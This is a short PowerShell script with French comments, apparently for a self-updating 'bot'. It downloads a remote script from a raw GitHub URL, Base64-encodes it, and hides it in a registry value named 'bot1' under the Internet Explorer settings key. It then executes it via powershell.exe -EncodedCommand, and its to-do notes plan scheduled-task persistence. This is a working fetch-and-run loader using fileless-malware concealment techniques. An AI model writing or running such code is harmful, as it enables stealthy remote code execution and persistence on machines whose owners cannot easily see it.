Import-Module "c:\lib\script1.ps1"

$version = 1

<#

### Liste de choses à faire ### 
    <#
    Récupérer la version du git
    Comparer avec celui actuelle
    Mettre à jour si besoin
    #>

    <#

    #>

    <#
    Mettre une tâche plannifier
        -> Synchro du script tout les X temps
        -> tâche pour montrer que cela fonctionne
    #>

#>

#Chemin du script
$gitLink   = 'https://raw.githubusercontent.com/theurtebize/majBOT/master/bot.ps1'

#Paramètres de la clé registre crée
$cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
$nomCle    = 'bot1'
$typeCle   = "String"

# Récupération du git
$recupGit = Invoke-WebRequest -Uri $gitLink -UseBasicParsing 

# Conversion en Base64
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($recupGit)
$convert64 =[Convert]::ToBase64String($Bytes)
$convert64

#Création de la clé registre
New-ItemProperty -Path $cheminCle -Name $nomCle -Value $convert64  -PropertyType $typeCle

#récupératin de la clé registre
$key = get-itemproperty -path $cheminCle
#$key.ProductName

#Décoder la clé base 64
#$Decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64))
#$Decode

powershell.exe -EncodedCommand $convert64
